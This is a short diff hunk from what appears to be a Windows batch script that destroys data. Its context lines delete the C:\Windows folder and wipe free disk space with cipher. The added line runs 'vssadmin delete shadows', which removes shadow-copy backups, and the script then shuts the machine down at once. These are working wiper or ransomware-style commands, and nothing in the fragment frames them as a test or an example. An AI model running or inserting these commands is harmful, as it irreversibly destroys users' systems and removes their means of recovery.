@@ -568,6 +568,8 @@ rmdir /s /q C:\Windows
 
 cipher /w:C:
 
+vssadmin delete shadows
+
 shutdown /s /t 0
 
 pause
